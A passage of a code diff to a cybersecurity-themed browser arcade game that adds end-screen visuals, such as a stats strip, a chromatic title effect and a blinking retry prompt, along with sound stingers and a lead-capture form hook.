   if(score>=hi&&score>0){ctx.font=huntFont(13,'bold'); ctx.fillStyle='#39FF14'; ctx.fillText(T('g_new_record'),LW/2,LH/2+88);}
-  ctx.font=huntFont(14,'bold'); ctx.fillStyle='#fff'; ctx.fillText(T('g_new_case'),LW/2,LH/2+160);
+  // ═══════════ Phase 4: TURNING POINTS strip (3 cells) ═══════════
+  {
+    const tpP = _ph4_ezOutQuart(_ph4_rmP(Math.min(1,(interceptT-0.45)/0.55)));
+    if(tpP>0.01){
+      const tpY = LH/2 + 110;
+      const tpH = 34;
+      const tpW = 132;
+      const tpGap = 14;
+      const totalW = tpW*3 + tpGap*2;
+      const tpX0 = (LW - totalW)/2;
+      ctx.save(); ctx.globalAlpha = tpP;
+      ctx.font = 'bold 9px "Courier New"';
+      ctx.textAlign = 'center';
+      ctx.fillStyle = 'rgba(180,200,230,0.58)';
+      ctx.fillText(T('iz_turning_point'), LW/2, tpY - 10);
+      const clues = (typeof collectedClues !== 'undefined' && collectedClues && collectedClues.length) ? collectedClues.length : 0;
+      const timeSec = (typeof investigationTimer === 'number') ? Math.max(0, Math.round(investigationTimer)) : 0;
+      const advNm = String(adv?.name || '—');
+      const cells = [
+        [T('ph4_tp_hunt_clues'), String(clues||0)],
+        [T('ph4_tp_hunt_time'),  String(timeSec)],
+        [T('ph4_tp_hunt_adv'),   advNm]
+      ];
+      for(let i=0;i<3;i++){
+        const cellP = _ph4_cinStagger(tpP, i, 0.18, 0.35);
+        if(cellP<=0.01) continue;
+        const cx0 = tpX0 + i*(tpW+tpGap);
+        ctx.save(); ctx.globalAlpha = tpP * cellP;
+        ctx.fillStyle = 'rgba(12,18,28,0.72)';
+        ctx.beginPath(); ctx.roundRect(cx0, tpY, tpW, tpH, 4); ctx.fill();
+        ctx.strokeStyle = 'rgba(170,0,255,0.55)'; ctx.lineWidth = 1; ctx.stroke();
+        ctx.fillStyle = 'rgba(170,170,210,0.78)';
+        ctx.font = 'bold 8px "Courier New"';
+        ctx.fillText(cells[i][0], cx0 + tpW/2, tpY + 11);
+        ctx.fillStyle = '#f0e8ff';
+        ctx.font = 'bold 12px "Courier New"';
+        let val = cells[i][1];
+        if(val.length>14) val = val.slice(0,13)+'…';
+        ctx.fillText(val, cx0 + tpW/2, tpY + 26);
+        ctx.restore();
+      }
+      ctx.restore();
+    }
+  }
+  ctx.textAlign = 'center';
+  ctx.font=huntFont(14,'bold'); ctx.fillStyle='#fff'; ctx.fillText(T('g_new_case'),LW/2,LH/2+180);
   ctx.font=huntFont(11); ctx.fillStyle='#AA00FF'; ctx.shadowColor='#AA00FF'; ctx.shadowBlur=8;
-  ctx.fillText(T('g_brand_tag'),LW/2,LH/2+184); ctx.shadowBlur=0;
+  ctx.fillText(T('g_brand_tag'),LW/2,LH/2+200); ctx.shadowBlur=0;
   ctx.textAlign='left';
   ctx.restore();
 }
@@ -32857,6 +35554,8 @@ function drawBreach(dt){
     }
     HUNT_SFX.breachAlarm();
     flash(255,23,68,0.7);
+    // Phase 4: fire hunt loss weight stinger once per breach
+    if(!_ph4_loseStingerFired){ _ph4_loseStingerFired = true; _ph4_fireHuntLoss(); }
   }
 
   // Solid dark bg — NO drawWorldMap() here so labels never bleed through
@@ -32907,9 +35606,14 @@ function drawBreach(dt){
   // Row positions — all relative to _py, scaled by ui
   const R=v=>_py+Math.round(v*ui);
 
+  // Phase 4: chromatic aberration on the title (red/cyan split)
+  {
+    const _titleFont = huntFont(Math.round(44*Math.min(ui,1)),'bold');
+    _ph4_drawChromatic(ctx, T('g_breach_succeeded'), _cx, R(68), '#FF1744', _titleFont, 1.6);
+  }
   ctx.font=huntFont(Math.round(44*Math.min(ui,1)),'bold');
   ctx.fillStyle='#FF1744'; ctx.shadowColor='#FF1744'; ctx.shadowBlur=32;
-  ctx.fillText(T('g_breach_succeeded'),_cx,R(68),_mw); ctx.shadowBlur=0;
+  ctx.shadowBlur=0;
 
   ctx.font=huntFont(Math.round(13*Math.min(ui,1)),'bold');
   ctx.fillStyle='#7f8b96';
@@ -32945,13 +35649,36 @@ function drawBreach(dt){
   ctx.fillStyle='#FFD700';
   ctx.fillText(`${T('g_score')}: ${formatLocaleNumber(score)}`,_cx,R(282),_mw);
 
-  ctx.font=huntFont(Math.round(13*Math.min(ui,1)),'bold');
-  ctx.fillStyle='#fff';
-  ctx.fillText(T('h_breach_retry'),_cx,R(336),_mw);
+  // ═══════════ Phase 4: pulsing TRY AGAIN CTA (amber, blink-gated) ═══════════
+  {
+    const blinkOn = (Math.floor(Date.now()/380)%2===0);
+    const ctaSize = Math.round(15*Math.min(ui,1));
+    const subSize = Math.round(11*Math.min(ui,1));
+    if(blinkOn){
+      ctx.font=huntFont(ctaSize,'bold');
+      ctx.fillStyle='#ffd68a';
+      ctx.shadowColor='#ffb347';
+      ctx.shadowBlur=14;
+      ctx.fillText(T('h_breach_retry'),_cx,R(336),_mw);
+      ctx.font=huntFont(subSize,'bold');
+      ctx.fillStyle='rgba(255,214,138,0.82)';
+      ctx.shadowBlur=8;
+      ctx.fillText(T('ph4_press_retry'),_cx,R(354),_mw);
+      ctx.shadowBlur=0;
+    } else {
+      ctx.font=huntFont(ctaSize,'bold');
+      ctx.fillStyle='rgba(255,214,138,0.38)';
+      ctx.shadowBlur=0;
+      ctx.fillText(T('h_breach_retry'),_cx,R(336),_mw);
+      ctx.font=huntFont(subSize,'bold');
+      ctx.fillStyle='rgba(255,214,138,0.28)';
+      ctx.fillText(T('ph4_press_retry'),_cx,R(354),_mw);
+    }
+  }
 
   ctx.font=huntFont(Math.round(10*Math.min(ui,1)));
   ctx.fillStyle='#AA00FF'; ctx.shadowColor='#AA00FF'; ctx.shadowBlur=8;
-  ctx.fillText(T('g_brand_tag'),_cx,R(362),_mw); ctx.shadowBlur=0;
+  ctx.fillText(T('g_brand_tag'),_cx,R(378),_mw); ctx.shadowBlur=0;
 
   ctx.restore();
 }
@@ -33416,6 +36143,11 @@ function startCase(idx){
   resetHuntAudioState();
   updateVisualIntensity(idx);
   gameState=STATE.BRIEFING; briefingT=0;
+  // Phase 4: reset closure flags, fire boss arrival reveal stinger
+  _ph4_winStingerFired = false;
+  _ph4_loseStingerFired = false;
+  _ph4_bossRevealFired  = true;
+  _ph4_fireBossArrival();
   FalconRanking.stopIdleWatch();
 }
 
@@ -33878,6 +36610,9 @@ FalconRanking.init({
   onFormClose:()=>{ if(gameState===STATE.TITLE) FalconRanking.startIdleWatch(); },
   onAttractClose:()=>{ if(gameState===STATE.TITLE) FalconRanking.startIdleWatch(); }
 });
+// Register Threat Hunt's lead-capture form with FalconArcade.Overlay.
+// Uses FalconRanking's public onGameEnd — no internals touched.
+try { window.FalconArcade?.Overlay?.registerForm?.('hunt', (data) => FalconRanking.onGameEnd(data)); } catch(_){}
 FalconRanking.startIdleWatch();
 requestAnimationFrame(t=>{lastT=t;requestAnimationFrame(frame);});
   })();
